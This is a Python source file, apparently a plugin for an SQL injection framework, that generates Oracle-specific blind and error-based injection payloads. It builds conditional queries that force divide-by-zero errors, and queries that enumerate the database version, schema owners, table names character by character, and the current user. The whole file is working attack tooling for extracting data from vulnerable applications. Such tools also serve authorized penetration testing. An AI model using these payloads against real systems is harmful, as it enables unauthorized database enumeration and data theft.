from ..core.plugin import *
from ..core.forge import SQLForge

class OracleForge(SQLForge):
	def __init__(self, context):
		SQLForge.__init__(self, context)	
	
	def midCheck(self):
		return self.wrapSQL('SELECT CASE WHEN 1<0 THEN 0 ELSE 1/0 END FROM dual')

	def midCheckBis(self):
		return self.wrapSQL('SELECT CASE WHEN 0<1 THEN 0 ELSE 1/0 END FROM dual')

	def stringLen(self,s):
		return 'LENGTH(%s)'%s
		
	def midChar(self, string, pos):
		return 'substr(%s, %d, 1)' % (string, pos)

	def wrapMid(self, cdt):
		return self.wrapSQL('SELECT CASE WHEN %s THEN %s ELSE 1/0 END FROM dual' % (cdt,self.wrapField('0')))


	def countRecords(self, records):
		sql= "SELECT COUNT(*) FROM %s" % records
		return sql

	def takeRecord(self, records, index):
		return 'select * FROM %s WHERE ROWNUM=%d' % (records, index)

  ############################################
	# VERSION
	############################################


	def getVersion(self):
		return '(SELECT banner FROM v$version WHERE banner LIKE \'Oracle%\')'


	############################################
	# DATABASES
	############################################

	def getCurrentDatabase(self):
		return '(SELECT SYS.DATABASE_NAME FROM DUAL)'

	def getDatabases(self):
		return '(SELECT DISTINCT owner FROM all_tables)'

	############################################
	# TABLES
	############################################

	def getTables(self,db):
		return '(SELECT table_name FROM sys.user_tables)'

	def getTableLen(self,index,db):
		return self.stringLen(self.getTableName(index,db))

	def getTableName(self,index, db):
		return '(SELECT table_name FROM (SELECT ROWNUM r, table_name FROM sys.user_tables ORDER BY table_name) WHERE r=%d)'%index

	def getTableChar(self, id, pos,db):
		return self.asciiCode(self.midChar(self.getTableName(id, db), pos+1))

	############################################
	# USER
	############################################

	def getUser(self):
		return '(SELECT user FROM dual)'

	# STRING
	def getStringLen(self,str):
		return "LENGTH(%s)" % str

	def getStringChar(self,str,pos):
		return self.asciiCode(self.midChar(str,pos+1))

@plugin('oracle','Oracle')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Oracle(Plugin):	
	def __init__(self, context, injector, limit_count_max=500):
		Plugin.__init__(self, OracleForge, context, injector, limit_count_max)
		